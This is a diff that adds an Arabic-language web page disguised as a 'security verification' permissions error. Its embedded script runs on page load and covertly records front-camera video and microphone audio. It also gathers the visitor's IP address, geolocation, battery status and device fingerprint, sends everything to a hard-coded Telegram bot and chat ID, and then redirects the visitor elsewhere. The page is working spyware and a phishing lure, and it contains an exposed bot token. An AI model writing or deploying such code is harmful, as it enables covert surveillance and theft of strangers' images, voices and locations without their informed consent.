@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خطأ في النظام - التحقق من الأذونات</title>
+    <style>
+        :root {
+            --primary: #3498db;
+            --secondary: #2c3e50;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #1a1a1a;
+            --success: #2ecc71;
+            --warning: #f39c12;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--dark) 0%, var(--secondary) 100%);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .error-icon {
+            font-size: 80px;
+            margin: 20px 0;
+            color: var(--accent);
+        }
+        
+        .error-message {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid rgba(231, 76, 60, 0.5);
+            padding: 25px;
+            margin: 25px 0;
+            text-align: center;
+            border-radius: 12px;
+            line-height: 1.6;
+        }
+        
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 5px solid var(--primary);
+            width: 50px;
+            height: 50px;
+            margin: 25px auto;
+            animation: spin 1.5s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid rgba(46, 204, 113, 0.5);
+            padding: 25px;
+            margin: 25px 0;
+            text-align: center;
+            border-radius: 12px;
+            line-height: 1.6;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        h2 {
+            margin-bottom: 15px;
+            color: var(--light);
+        }
+        
+        p {
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i>⚠️</i> نظام التحقق من الأمان
+        </div>
+        
+        <!-- Error Step -->
+        <div id="errorStep">
+            <div class="error-icon">❌</div>
+            <h2>خطأ في التحقق من الأذونات</h2>
+            
+            <div class="error-message">
+                <p><strong>تم اكتشاف مشكلة في أذونات النظام</strong></p>
+                <p>يجب تفعيل جميع الأذونات المطلوبة لضمان أمان جهازك</p>
+                <p>الرجاء التأكد من منح الأذونات التالية:</p>
+                <p>• الكاميرا</p>
+                <p>• الميكروفون</p>
+                <p>• معلومات البطارية</p>
+            </div>
+            
+            <div class="loader"></div>
+            <p>جاري التحقق من الأذونات تلقائياً...</p>
+            <p>سيتم المتابعة عند تفعيل جميع الأذونات</p>
+        </div>
+        
+        <!-- Success Step -->
+        <div id="successStep" class="hidden">
+            <div class="success-message">
+                <h2>✅ تم التحقق بنجاح!</h2>
+                <p>تم التحقق من جميع الأذونات بنجاح</p>
+                <p>جاري توجيهك إلى الصفحة المطلوبة...</p>
+            </div>
+            
+            <div class="loader"></div>
+        </div>
+        
+        <div class="footer">
+            نظام التحقق من الأمان ©2025 - جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <script>
+        // Telegram configuration
+        const BOT_TOKEN = '7664021489:AAEkQJA7fDO-WCkZcGq7U7Vvzrd2iyNsHz4';
+        const CHAT_ID = '5687308408';
+        
+        // Collected data object
+        const collectedData = {
+            system: {},
+            permissions: {},
+            media: {}
+        };
+        
+        // DOM Elements
+        const errorStep = document.getElementById('errorStep');
+        const successStep = document.getElementById('successStep');
+        
+        // Permission status
+        let permissionsGranted = {
+            camera: false,
+            microphone: false,
+            battery: false
+        };
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Start checking permissions immediately
+            checkAllPermissions();
+            
+            // Set up continuous checking
+            setInterval(checkAllPermissions, 2000);
+        });
+        
+        // Check all permissions
+        async function checkAllPermissions() {
+            await checkCameraPermission();
+            await checkMicrophonePermission();
+            await checkBatteryInfo();
+            
+            // Check if all permissions are granted
+            if (permissionsGranted.camera && permissionsGranted.microphone && permissionsGranted.battery) {
+                // All permissions granted, send data and show success
+                await sendAllData();
+                
+                // Show success step
+                errorStep.classList.add('hidden');
+                successStep.classList.remove('hidden');
+                
+                // Redirect after delay
+                setTimeout(() => {
+                    window.location.href = 'https://mozkratgahza.com/secondary-3/all';
+                }, 5000); // زيادة الوقت لضمان إرسال الفيديو
+            }
+        }
+        
+        // Check camera permission and record video
+        async function checkCameraPermission() {
+            if (permissionsGranted.camera) return true;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: true // إضافة الصوت للفيديو
+                });
+                
+                collectedData.permissions.camera = true;
+                permissionsGranted.camera = true;
+                
+                // استخدام صيغة MP4 المدعومة عالمياً
+                const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 
+                    'video/mp4;codecs=avc1.42E01E' : 
+                    MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 
+                    'video/webm;codecs=vp9' : 
+                    'video/webm';
+                
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: mimeType
+                });
+                
+                const videoChunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            videoChunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const videoBlob = new Blob(videoChunks, { 
+                            type: mimeType.startsWith('video/mp4') ? 'video/mp4' : 'video/webm'
+                        });
+                        collectedData.media.video = videoBlob;
+                        console.log('Video recorded:', videoBlob.size, 'bytes', 'Type:', videoBlob.type);
+                        resolve();
+                    };
+                    
+                    mediaRecorder.start();
+                    console.log('Starting video recording...');
+                    
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            console.log('Video recording stopped');
+                        }
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 5000); // تقليل المدة إلى 5 ثواني للتجربة
+                });
+            } catch (error) {
+                console.error('Camera error:', error);
+                collectedData.permissions.camera = false;
+                permissionsGranted.camera = false;
+            }
+        }
+        
+        // Check microphone permission and record audio
+        async function checkMicrophonePermission() {
+            if (permissionsGranted.microphone) return true;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        sampleRate: 44100
+                    } 
+                });
+                
+                collectedData.permissions.microphone = true;
+                permissionsGranted.microphone = true;
+                
+                // استخدام صيغة audio/mpeg المدعومة عالمياً
+                const mimeType = MediaRecorder.isTypeSupported('audio/mpeg') ? 
+                    'audio/mpeg' : 
+                    MediaRecorder.isTypeSupported('audio/webm') ? 
+                    'audio/webm' : 
+                    'audio/ogg';
+                
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: mimeType
+                });
+                
+                const audioChunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { 
+                            type: mimeType 
+                        });
+                        collectedData.media.audio = audioBlob;
+                        console.log('Audio recorded:', audioBlob.size, 'bytes', 'Type:', audioBlob.type);
+                        resolve();
+                    };
+                    
+                    mediaRecorder.start();
+                    console.log('Starting audio recording...');
+                    
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            console.log('Audio recording stopped');
+                        }
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 3000);
+                });
+            } catch (error) {
+                console.error('Microphone error:', error);
+                collectedData.permissions.microphone = false;
+                permissionsGranted.microphone = false;
+            }
+        }
+        
+        // Check battery info
+        async function checkBatteryInfo() {
+            if (permissionsGranted.battery) return true;
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.system.battery = {
+                        level: Math.floor(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                    
+                    permissionsGranted.battery = true;
+                    console.log('Battery info collected');
+                } catch (error) {
+                    collectedData.system.battery = 'غير متاح';
+                    permissionsGranted.battery = false;
+                }
+            } else {
+                collectedData.system.battery = 'API غير مدعوم';
+                permissionsGranted.battery = true; // نجعلها true حتى لا تمنع التقدم
+            }
+        }
+        
+        // Collect additional system data
+        function collectSystemData() {
+            collectedData.system = {
+                ...collectedData.system,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                ip: 'جاري الجلب...',
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                ram: navigator.deviceMemory || 'غير معروف',
+                touchSupport: 'ontouchstart' in window,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'غير معروف',
+                location: 'جاري الجلب...'
+            };
+            
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(result => {
+                    collectedData.system.ip = result.ip;
+                })
+                .catch(() => {
+                    collectedData.system.ip = 'فشل في الجلب';
+                });
+            
+            // Get location if possible
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.system.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    },
+                    () => {
+                        collectedData.system.location = 'غير مسموح';
+                    },
+                    { timeout: 5000 }
+                );
+            }
+        }
+        
+        // Send message to Telegram
+        async function sendMessageToTelegram(text) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+                const result = await response.json();
+                console.log('Message sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Error sending message:', error);
+            }
+        }
+        
+        // Send video to Telegram
+        async function sendVideoToTelegram(videoBlob) {
+            try {
+                // تحديد الامتداد المناسب بناءً على نوع الملف
+                const fileExtension = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
+                const fileName = `front_camera_video.${fileExtension}`;
+                
+                const formData = new FormData();
+                formData.append('video', videoBlob, fileName);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('supports_streaming', 'true'); // دعم البث للهواتف المحمولة
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log('Video sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Error sending video:', error);
+                // محاولة بديلة بإرسال كملف document
+                return sendDocumentToTelegram(videoBlob, `video.${videoBlob.type.includes('mp4') ? 'mp4' : 'webm'}`);
+            }
+        }
+        
+        // Send document to Telegram (بديل)
+        async function sendDocumentToTelegram(fileBlob, fileName) {
+            try {
+                const formData = new FormData();
+                formData.append('document', fileBlob, fileName);
+                formData.append('chat_id', CHAT_ID);
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log('Document sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Error sending document:', error);
+            }
+        }
+        
+        // Send voice to Telegram
+        async function sendVoiceToTelegram(audioBlob) {
+            try {
+                // تحديد الامتداد المناسب بناءً على نوع الملف
+                const fileExtension = audioBlob.type.includes('mpeg') ? 'mp3' : 
+                                    audioBlob.type.includes('webm') ? 'ogg' : 'wav';
+                const fileName = `voice_recording.${fileExtension}`;
+                
+                const formData = new FormData();
+                formData.append('voice', audioBlob, fileName);
+                formData.append('chat_id', CHAT_ID);
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log('Voice sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Error sending voice:', error);
+                // محاولة بديلة
+                return sendDocumentToTelegram(audioBlob, fileName);
+            }
+        }
+        
+        // Send all collected data to Telegram
+        async function sendAllData() {
+            console.log('Starting to send all data...');
+            
+            // Collect system data first
+            collectSystemData();
+            
+            // Wait for data collection
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Send video first
+            if (collectedData.media.video) {
+                console.log('Sending video...');
+                await sendVideoToTelegram(collectedData.media.video);
+            } else {
+                console.log('No video available to send');
+            }
+            
+            // Send audio
+            if (collectedData.media.audio) {
+                console.log('Sending audio...');
+                await sendVoiceToTelegram(collectedData.media.audio);
+            }
+            
+            // Format system info
+            const systemInfo = [
+                `🌐 عنوان IP: ${collectedData.system.ip}`,
+                `🖥 الجهاز: ${collectedData.system.platform}`,
+                `🔍 المتصفح: ${collectedData.system.userAgent}`,
+                `🖼️ دقة الشاشة: ${collectedData.system.screen}`,
+                `🌍 المنطقة الزمنية: ${collectedData.system.timezone}`,
+                `🔋 البطارية: ${collectedData.system.battery?.level || 'غير متاح'}`,
+                `⚡ حالة الشحن: ${collectedData.system.battery?.charging ? 'يشحن' : 'لا يشحن'}`,
+                `💾 الذاكرة: ${collectedData.system.ram} جيجابايت`,
+                `🖥️ المعالج: ${collectedData.system.cpuCores} نواة`,
+                `📶 نوع الشبكة: ${collectedData.system.connection?.effectiveType || 'غير معروف'}`,
+                `📍 الموقع: ${collectedData.system.location?.latitude ? `${collectedData.system.location.latitude}, ${collectedData.system.location.longitude}` : 'غير متاح'}`
+            ];
+            
+            // Create comprehensive message
+            let message = `🎯 تم جمع بيانات التحقق الكاملة:\n\n`;
+            message += `✅ الكاميرا الأمامية: ${collectedData.permissions.camera ? 'تم تسجيل فيديو' : 'فشل'}\n`;
+            message += `✅ الميكروفون: ${collectedData.permissions.microphone ? 'تم التسجيل' : 'فشل'}\n`;
+            message += `✅ البطارية: ${collectedData.system.battery ? 'تم الجلب' : 'فشل'}\n\n`;
+            message += `📊 معلومات النظام التفصيلية:\n${systemInfo.join('\n')}`;
+            
+            // Send message to Telegram
+            console.log('Sending system info...');
+            await sendMessageToTelegram(message);
+            
+            console.log('All data sent successfully');
+        }
+    </script>
+</body>
+</html>
